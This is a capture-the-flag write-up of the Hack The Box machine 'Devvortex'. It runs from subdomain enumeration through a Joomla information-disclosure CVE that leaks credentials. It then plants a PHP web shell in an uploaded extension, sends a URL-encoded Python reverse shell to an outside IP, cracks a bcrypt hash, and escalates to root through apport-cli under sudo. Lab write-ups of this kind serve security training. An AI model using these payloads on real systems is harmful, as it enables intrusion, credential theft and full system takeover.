# Devvortex 

## NMAP 
```bash
sudo nmap 10.10.11.242 -O -sC 
[sudo] password for angelo: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-23 13:48 CET
Nmap scan report for devvortex.htb (10.10.11.242)
Host is up (0.27s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http
|_http-title: DevVortex
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=12/23%OT=22%CT=1%CU=44458%PV=Y%DS=2%DC=I%G=Y%TM=6586D7
OS:56%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST
OS:11NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.69 seconds
```

## USER FLAG

DNS is not correctly configured.
In order to access the site, configure dns in `/etc/hosts`
with the following:

```bash
10.10.11.242 devvortex.htb
```
Trying to enumerate directories with `gobuster` will not produce everything.
Trying to enumerate `DNS` subdomains will not produce anything with `gobuster`, but this is probbaly due to HTB implementation.

EDIT:

> gobuster support vhost enumeration too: ```gobuster vhost -u devvortex.htb -w ~/SecLists/Discovery/DNS/subdomains-top1million-5000.txt```

So if you look at host header via burpsuite, you can notice that changing host will not return server errors, instead it tries to resolve the host. In particular we can see that injecting someghing like:

```
Host: whatever.devvortex.htb
```

will return always a status code like `302 redirection`.
This is beacuse virtual host are configured. So more DNS are managed by the same server and we can enumerate others subdomains with this technique. We need a more detailed software to reach our scope:

enumerate dns subdomains by looking at returned status code when injecting host header.

We can achieve this with ffuf

```bash
# virtual host enumeration through ffuf
ffuf -c -w ~/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://devvortex.htb -H "Host: FUZZ.devvortex.htb" -fc 302
```

302 is the bad status code which is returned when subdomain does not exists and is specified with flag `-fc`

Result:

```bash
dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 216ms]
```

so in order to access the new domain, we need to add it to `/etc/hosts` too:


```
10.10.11.242 devvortex.htb
10.10.11.242 dev.devvortex.htb
```

Visiting `10.10.11.242 devvortex.htb` will show a page about site development. Running some checks with `CMSMap` (or `CMSeek`) or visiting `/administrator` will confirm the usage of `JOOMLA CMS`. We can enumerate Joomla issues with some software.

Using Nuclei, will return an `Information Disclosure` CVE on JOOMLA leading direct access to admin through admin credentials.

```
4.0.0 <= Joomla <= 4.2.7 Unauthenticated Information Disclosure
```

`
[CVE-2023-23752] [http] [medium] http://dev.devvortex.htb/api/index.php/v1/config/application?public=true
`

The information dislosure returns configuration files information about db connection through Joomla Rest API call.

```json
{
    "type": "application",
    "id": "224",
    "attributes": {
        "user": "lewis",
        "id": 224
    }
},
{
    "type": "application",
    "id": "224",
    "attributes": {
        "password": "P4ntherg0t1n5r3c0n##",
        "id": 224
    }
}
```

Now, we can login in through administrator using such credentials, and it works. The're the same!

We can upload a joomla extension and infect it with the first joomla extensions I can donwload.

I used `j_download`, then I modified a file of the extension `scan.php` after i saw i could reach that file using the following url:


```
/administrator/components/com_jdownloads/helpers/scan.php
```

So I modified `/admin/helpers/scan.php`

with the following:

```php
$var = $_GET['cmd'];
system($var);
die();
```

The i zipped the extension again and I uploaded it through joomla administration panel.

reverse shell


```bash
GET /administrator/components/com_jdownloads/helpers/scan.php?cmd=export+RHOST%3d"10.10.16.48"%3bexport+RPORT%3d1234%3bpython3+-c+'import+sys,socket,os,pty%3bs%3dsocket.socket()%3bs.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))%3b[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)]%3bpty.spawn("sh")' HTTP/1.1
```

key bindings

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl+z
stty raw -echo
fg
```


We are `www-data` and we cannot read `/home/user.txt`, only users and root can.
We can see that the user in the system is called logan.
Getting back to our joomla config we can see from `configuration.php` but this is exactly the same content returned by the sensitive information disclosure vulnerability the following:


```php
        public $host = 'localhost';
        public $user = 'lewis';        
        public $password = 'P4ntherg0t1n5r3c0n##';
        public $db = 'joomla';
        public $dbprefix = 'sd4fg_';
        public $dbencryption = 0;      
        public $dbsslverifyservercert = false;
        public $dbsslkey = '';               
        public $dbsslcert = '';
        public $dbsslca = '';     
        public $dbsslcipher = '';   
        public $force_ssl = 0;
        public $live_site = '';
        public $secret = 'ZI7zLTbaGKliS9gq';
```

Login in mysql

```
mysql -ulewis -p 'P4ntherg0t1n5r3c0n##' -d joomla
```

```sql
select * from sd4fg_users;
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2023-12-23 17:57:07 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+--------------------------------------------------
```

Bcrypt hashes.
cracked logan hashes using hashcat:

```bash
hashcat -a 0 -m 3200 '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12' ~/SecLists/rockyou.txt
```

```
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho
```

# Root

Acutally you could have logged in with 

```
ssh lewis@10.10....
```

but it didn't worked for me. Maybe i typed the wrong password.

Running linux smurt enum script, will soon return useful info about sudo programs that can be run from users.
This is the equivalent of running:

```bash
sudo -l

Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

Apport is a software to handle crash reports of other running softwares on ubuntu. The apport has many vulnerabilites on version `2.20`.

```bash
apport-cli --version
```

so we have `apport-cli` which is a python script which can run with sudo privileges. `apport-cli` allows to manage and handle crashes. 

The CVE wich we can exploit is the following:

https://github.com/diego-tella/CVE-2023-1326-PoC

In practize, when a report is generated you can use `apport-cli` to manipulate it. In fact, openening viewer mode on a report runs more internally. So we can from here useL

```bash
!/bin/bash
```

to spawn a bash with root privileges.

But first we need to generate a report which can be parsed. We can use `apport-cli` itself to generate a report whith its own format.

```bash
apport-cli -f -p firefox --save=/tmp/test.crash
```

This generates a fake firefox report crash, then we can view it.

```bash
sudo /usr/bin/apport-cli -c /tmp/test.crash
```

once opened, click `v` or view mode and then type:

```bash
!/bin/bash
```
to run as root.

Remember that shell must run with `stty raw -echo` otherwise we can't use `more` from shell.
